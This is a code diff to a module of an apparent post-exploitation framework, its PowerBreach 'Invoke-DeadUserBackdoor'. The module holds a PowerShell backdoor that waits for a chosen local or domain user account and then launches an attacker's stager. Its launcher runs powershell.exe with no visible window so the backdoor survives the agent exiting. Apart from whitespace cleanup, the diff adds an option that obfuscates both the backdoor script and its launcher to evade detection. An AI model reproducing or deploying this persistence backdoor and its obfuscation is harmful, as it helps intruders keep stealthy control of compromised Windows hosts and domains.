@@ -15,13 +15,13 @@ class Module:
             'Background' : False,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : False,
 
             'OpsecSafe' : True,
-            
+
             'MinPSVersion' : '2',
-            
+
             'Comments': [
                 'http://sixdub.net'
             ]
@@ -79,12 +79,12 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         script = """
 function Invoke-DeadUserBackdoor
 {
-    Param(  
+    Param(
     [Parameter(Mandatory=$False,Position=1)]
     [int]$Timeout=0,
     [Parameter(Mandatory=$False,Position=2)]
@@ -94,7 +94,7 @@ function Invoke-DeadUserBackdoor
     [Parameter(Mandatory=$False,Position=4)]
     [switch] $Domain
     )
-    
+
     $running=$True
     $match =""
     $starttime = Get-Date
@@ -103,7 +103,7 @@ function Invoke-DeadUserBackdoor
         if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))
         {
             $running=$False
-        }        
+        }
         if($Domain)
         {
             $UserSearcher = [adsisearcher]"(&(samAccountType=805306368)(samAccountName=*$UserName*))"
@@ -134,7 +134,7 @@ function Invoke-DeadUserBackdoor
         {
             Start-Sleep -s $Sleep
         }
-    }   
+    }
 }
 Invoke-DeadUserBackdoor"""
 
@@ -159,7 +159,7 @@ Invoke-DeadUserBackdoor"""
             else:
                 script = script.replace("REPLACE_LAUNCHER", stagerCode)
                 script = script.encode('ascii', 'ignore')
-        
+
         for option,values in self.options.iteritems():
             if option.lower() != "agent" and option.lower() != "listener" and option.lower() != "outfile":
                 if values['Value'] and values['Value'] != '':
@@ -167,8 +167,9 @@ Invoke-DeadUserBackdoor"""
                         # if we're just adding a switch
                         script += " -" + str(option)
                     else:
-                        script += " -" + str(option) + " " + str(values['Value']) 
-
+                        script += " -" + str(option) + " " + str(values['Value'])
+        if obfuscate:
+            script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
         outFile = self.options['OutFile']['Value']
         if outFile != '':
             # make the base directory if it doesn't exist
@@ -183,12 +184,17 @@ Invoke-DeadUserBackdoor"""
             return ""
 
         # transform the backdoor into something launched by powershell.exe
-        # so it survives the agent exiting  
-        launcher = helpers.powershell_launcher(script) 
+        # so it survives the agent exiting
+        launcher = helpers.powershell_launcher(script)
         stagerCode = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
         parts = stagerCode.split(" ")
 
         # set up the start-process command so no new windows appears
         scriptLauncher = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-DeadUserBackdoor started'" % (parts[0], " ".join(parts[1:]))
-
+        if obfuscate:
+            scriptLauncher = helpers.obfuscate(psScript=scriptLauncher, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
         return scriptLauncher
+
+    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
+        return
+        
